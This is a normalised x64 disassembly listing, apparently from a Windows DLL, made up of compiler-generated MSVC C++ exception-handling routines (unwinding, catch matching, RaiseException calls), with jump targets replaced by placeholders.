lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
add edi 0xffffffff
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_1800146d8
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_1800068b0
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_180013f84
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_1800068b0
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_1800068b0
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_1800068b0
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_180015734
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18001400c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_1800068b0
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_1800068b0
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_180015734
call sub_1800068b0
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_1800140b0
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_1800068b0
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_180014104
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rsi rdx
mov rcx rsi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_180014478
mov edi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_18000efa8
test edx edx
je r-xdata
movsxd rcx [ rsi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rsi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp edi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp edi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rsi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
cmp [ r8 ] r11d
jne r-xdata
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rsi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov [ r8 ] edx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_18001422c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_1800068b0
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_1800068b0
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_1800068b0
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180014270
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800068b0
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_1800142a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_1800068b0
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_1800068b0
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_18000efa8
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_18000efa8
call sub_1800068b0
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180014304
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x5a0
mov rsi rdx
mov rbp rcx
mov rdi r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rbx r9
call sub_1800059c0
mov rax [ rsp + 0x5d0 ]
mov rdx [ rsp + 0x5e8 ]
mov rcx [ rbp ]
mov [ rsp + 0x60 ] rax
movsxd rax [ rsp + 0x5d8 ]
lea r11 [ sub_1800149a8 ]
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x68 ] rax
mov rax [ rsp + 0x5e0 ]
xor r9d r9d
mov [ rsp + 0x78 ] rax
movzx eax [ rsp + 0x5f0 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x88 ] rax
mov rax [ rdx + 0x40 ]
mov rdx [ rdx ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x90 ] 0x19930520
mov [ rsp + 0x20 ] rax
call RtlUnwindEx
lea r11 [ rsp + 0x5a0 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
sub_1800143ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_18000efa8
xor ecx ecx
test edi edi
je r-xdata
call sub_18000efa8
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1800144b4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_180013d84
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_18001452c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800086c8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180004690
sub_180014568
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
cmp esi ebx
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_180013e70
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
cmp esi ebx
je r-xdata
cmp r11 rbx
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_180013e70
lea r11 [ rsi + rax ]
jmp r-xdata
cmp esi ebx
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_180013e70
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_180013e88
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_180013e70
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_180013e88
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_18000fc40
cmp eax ebx
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_18001468c
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434f4d
je r-xdata
call sub_1800068b0
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x28
retn
call sub_1800068b0
dec [ rax + 0x100 ]
call sub_1800068b0
and [ rax + 0x100 ] 0x0
call sub_18000ef84
sub_1800146d8
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov rbx rdx
mov r14 rcx
call sub_180014480
mov edi eax
call sub_180013e70
mov r15 rax
mov [ rsp + 0x28 ] rax
call sub_1800068b0
inc [ rax + 0x100 ]
call sub_1800068b0
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_1800068b0
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx rbx
mov rcx r14
call sub_1800144a8
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_18000efa8
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_18000efa8
movsxd r12 edi
call sub_180013e70
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_180013e70
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_180013e70
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180013e70
add rax rbx
mov rbx [ rsp + 0x78 ]
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx rbx
mov rcx r14
call sub_1800144a8
call sub_180013e70
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
mov rbx [ rsp + 0x78 ]
jmp r-xdata
xor eax eax
call sub_180013e70
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180013e70
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_1800159f0
mov rcx r15
call sub_180013ea0
sub_18001486c
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_1800148d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_18000efa8
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_180013e88
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_180013e88
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_180013e88
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_180013e70
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_180014568
test eax eax
jne r-xdata
jmp r-xdata
sub_1800149a8
push rbx
push rsi
push rdi
push r13
push r14
push r15
sub rsp 0x98
mov rdi rcx
xor r14d r14d
mov [ rsp + 0x20 ] r14d
and [ rsp + 0xd0 ] r14d
and [ rsp + 0x48 ] r14
and [ rsp + 0x40 ] r14
call sub_1800068b0
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xe8 ] rax
call sub_1800068b0
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xe0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xd8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x58 ] rax
mov r13 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r13
call sub_1800068b0
mov [ rax + 0xf0 ] rsi
call sub_1800068b0
mov [ rax + 0xf8 ] rbx
call sub_1800068b0
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x78 ]
call sub_18001422c
mov r15 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r14
je r-xdata
mov r8d 0x100
mov rdx r13
mov rcx [ rsp + 0x58 ]
call sub_1800159f0
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xe8 ]
jmp r-xdata
mov [ rsp + 0xd0 ] 0x1
call sub_1800068b0
mov rbx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rbx
call sub_1800068b0
mov [ rax + 0xf0 ] rbx
mov rcx r15
call sub_1800142a4
test r14d r14d
jne r-xdata
call sub_1800068b0
mov rcx [ rsp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_1800068b0
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x98
pop r15
pop r14
pop r13
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180014270
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001486c
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180014ab9
mov [ rsp + 0x20 ] 0x1
call sub_1800068b0
and [ rax + 0x2c0 ] 0x0
cmp [ rsp + 0xd0 ] 0x0
je r-xdata
mov rsi [ rsp + 0xd8 ]
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
call [ RaiseException@IAT ]
mov dl 0x1
mov rsi [ rsp + 0xd8 ]
mov rcx rsi
call sub_18001486c
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
call [ RaiseException@IAT ]
jmp r-xdata
call sub_1800068b0
mov rcx [ rsp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_1800068b0
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x98
pop r15
pop r14
pop r13
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
mov r14d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xe8 ]
mov r13 [ rsp + 0x60 ]
mov r15 [ rsp + 0x50 ]
mov rcx r15
call sub_1800142a4
test r14d r14d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180014270
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001486c
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180014bd4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
cmp r13d ebx
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_180013e70
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
cmp r13d ebx
je r-xdata
cmp r11 rbx
je r-xdata
mov r11 rbx
call sub_180013e70
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
bt [ rdi ] 0x1f
jb r-xdata
bt [ rdi ] 0x1f
jae r-xdata
test [ rdi ] 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
mov edi 0x1
test [ rsi ] dil
je r-xdata
mov edi 0x1
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015968
cmp eax ebx
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015968
cmp eax ebx
je r-xdata
call sub_18000efa8
mov edx edi
mov rcx r12
call sub_180015968
cmp eax ebx
je r-xdata
mov r11 rbx
call sub_180013e88
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
call sub_18000efa8
mov edx edi
mov rcx r12
call sub_180015968
cmp eax ebx
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
lea rdx [ rsi + 0x8 ]
call sub_1800148b0
mov [ r12 ] rax
jmp r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015968
cmp eax ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015968
cmp eax ebx
je r-xdata
cmp r11 rbx
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_1800059c0
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
call sub_18000efa8
mov edx edi
mov rcx r12
call sub_180015968
cmp eax ebx
je r-xdata
call sub_18000efa8
mov edx edi
mov rcx r12
call sub_180015968
cmp eax ebx
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_1800148b0
mov rdx rax
mov r8 r10
mov rcx r12
call sub_1800059c0
jmp r-xdata
lea rdx [ rsi + 0x8 ]
mov rcx [ r12 ]
call sub_1800148b0
mov [ r12 ] rax
jmp r-xdata
mov rcx rbx
call sub_180013e88
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180015968
cmp eax ebx
je r-xdata
sub_180014dfc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
bt [ r8 ] 0x1f
jae r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
cmp eax 0x1
jne r-xdata
call sub_180014bd4
sub eax 0x1
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_1800148b0
mov rdx rax
mov rcx rdi
call r10
call sub_180013e88
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_1800148b0
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_180013e88
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_180014eac
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_180013d84
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_180013e70
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xd8 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_180014304
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_180014dfc
sub_180014f70
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
cmp [ rcx ] 0x80000003
mov r13 r9
mov rdi r8
mov r14 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xb8 ]
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_1800068b0
mov r15d [ rsp + 0xe0 ]
mov rbp [ rsp + 0xd0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_1800068b0
mov rbx rax
call __imp_EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xd8 ]
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xb0 ]
mov r8d r15d
mov r9d r12d
mov rdx rbp
mov rcx r14
mov [ rsp + 0x20 ] rax
call sub_180014104
mov rdi rax
mov eax [ rsp + 0xb0 ]
jmp r-xdata
call sub_18000efa8
cmp [ rsi ] 0xe0434f4d
je r-xdata
cmp eax [ rsp + 0x60 ]
jb r-xdata
mov rax [ rsp + 0xe8 ]
mov r9 r13
mov r8 rdi
mov [ rsp + 0x30 ] rax
mov rdx r14
mov rcx rsi
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rbp
call sub_1800140b0
test eax eax
jne r-xdata
cmp r12d [ rdi ]
jl r-xdata
inc eax
add rdi 0x14
mov [ rsp + 0xb0 ] eax
cmp r12d [ rdi + 0x4 ]
jg r-xdata
call sub_180013e70
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_180013e70
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180013e70
add rax rbx
jmp r-xdata
call sub_180013e70
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_180013e70
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov eax [ rsp + 0xb0 ]
call sub_180013e70
mov ecx [ rdi + 0xc ]
mov r8 [ rsp + 0xc0 ]
mov [ rsp + 0x58 ] 0x0
mov [ rsp + 0x50 ] 0x1
dec ecx
movsxd rcx ecx
mov r9 r13
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x10 ]
mov rdx r14
add rcx rax
mov rax [ rsp + 0xe8 ]
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x40 ] r15d
mov [ rsp + 0x38 ] rdi
and [ rsp + 0x30 ] 0x0
